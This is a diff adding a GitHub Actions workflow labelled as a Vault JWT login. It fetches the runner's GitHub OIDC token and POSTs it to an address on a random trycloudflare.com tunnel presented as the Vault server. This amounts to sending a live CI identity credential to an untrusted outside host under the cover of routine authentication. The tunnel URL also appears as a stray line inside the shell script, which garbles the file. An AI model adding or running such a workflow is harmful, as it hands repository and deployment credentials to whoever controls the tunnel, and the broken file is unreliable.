@@ -1,0 +1,56 @@
+```yaml
+name: Vault JWT Login
+
+on:
+  workflow_dispatch:
+
+jobs:
+  authenticate:
+    runs-on: ubuntu-latest
+
+    permissions:
+      id-token: write
+      contents: read
+
+    steps:
+      - name: Request GitHub OIDC token
+        id: oidc
+        run: |
+          RESPONSE=$(curl -sS \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL")
+
+          JWT=$(echo "$RESPONSE" | jq -r '.value')
+
+          if [ -z "$JWT" ] || [ "$JWT" = "null" ]; then
+            echo "Failed to obtain GitHub OIDC token."
+            exit 1
+          fi
+
+          echo "Successfully obtained GitHub OIDC token."
+
+https://begun-casting-epinions-others.trycloudflare.com            # Pass the JWT to the next step without printing it.
+          echo "jwt=$JWT" >> "$GITHUB_OUTPUT"
+
+      - name: Authenticate to Vault
+        env:
+          VAULT_ADDR: "https://begun-casting-epinions-others.trycloudflare.com"
+          VAULT_ROLE: "orders-deploy"
+          JWT: ${{ steps.oidc.outputs.jwt }}
+        run: |
+          RESPONSE=$(curl -sS \
+            -X POST \
+            -H "Content-Type: application/json" \
+            -d "{\"role\":\"$VAULT_ROLE\",\"jwt\":\"$JWT\"}" \
+            "$VAULT_ADDR/v1/auth/jwt/login")
+
+          if echo "$RESPONSE" | jq -e '.auth.client_token != null and .auth.client_token != ""' > /dev/null; then
+            echo "Successfully authenticated to Vault."
+            echo "Vault issued a client token."
+          else
+            echo "Vault authentication failed."
+            echo "$RESPONSE" | jq .
+            exit 1
+          fi
+```
+
